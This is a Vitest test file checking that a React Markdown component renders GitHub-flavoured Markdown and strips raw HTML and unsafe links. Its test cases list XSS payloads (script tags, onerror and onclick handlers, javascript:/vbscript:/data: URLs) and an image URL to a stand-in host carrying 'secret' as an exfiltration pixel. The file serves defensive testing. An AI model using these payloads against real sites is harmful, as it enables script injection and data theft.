// @vitest-environment jsdom
import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { Markdown } from "../src/markdown/Markdown.tsx";

afterEach(cleanup);

describe("Markdown (docs/SECURITY.md T10)", () => {
  it("renders GFM: headings, lists, tables, task lists, and code", () => {
    const { container } = render(
      <Markdown
        text={
          "# Title\n\n- a\n- [x] done\n\n| h |\n| - |\n| c |\n\n```ts\nconst x = 1;\n```\n\nSome `code`."
        }
      />,
    );
    expect(container.querySelector("h1")?.textContent).toBe("Title");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("table td")?.textContent).toBe("c");
    expect(container.querySelector("pre code")?.textContent).toBe("const x = 1;");
    expect(container.textContent).toContain("ts");
  });

  it.each([
    "<script>window.pwned = 1</script>",
    '<img src=x onerror="window.pwned=1">',
    '<iframe src="https://evil.test"></iframe>',
    '<a href="javascript:alert(1)">x</a>',
    '<div onclick="alert(1)">click</div>',
    "<style>body{display:none}</style>",
  ])("does not render raw HTML: %s", (html) => {
    const { container } = render(<Markdown text={`before\n\n${html}\n\nafter`} />);
    expect(container.querySelector("script, iframe, style, img, [onclick], [onerror]")).toBeNull();
    expect((window as unknown as { pwned?: number }).pwned).toBeUndefined();
  });

  it.each([
    "javascript:alert(1)",
    "JavaScript:alert(1)",
    "data:text/html,hi",
    "vbscript:x",
    "/local/path",
  ])("does not make a link to %s", (url) => {
    const { container } = render(<Markdown text={`[click](${url})`} />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toBe("click");
  });

  it("opens safe links in a new tab without a referrer", () => {
    const { container } = render(<Markdown text="[site](https://example.com)" />);
    const link = container.querySelector("a")!;
    expect(link.getAttribute("href")).toBe("https://example.com");
    expect(link.getAttribute("target")).toBe("_blank");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  });

  it("never loads images: they become links", () => {
    const { container } = render(<Markdown text="![pixel](https://evil.test/p.png?d=secret)" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")?.textContent).toBe("[image: pixel]");
  });

  it("drops an image with an unsafe URL to plain text", () => {
    const { container } = render(<Markdown text="![x](javascript:alert(1))" />);
    expect(container.querySelector("a, img")).toBeNull();
    expect(container.textContent).toBe("[image: x]");
  });
});
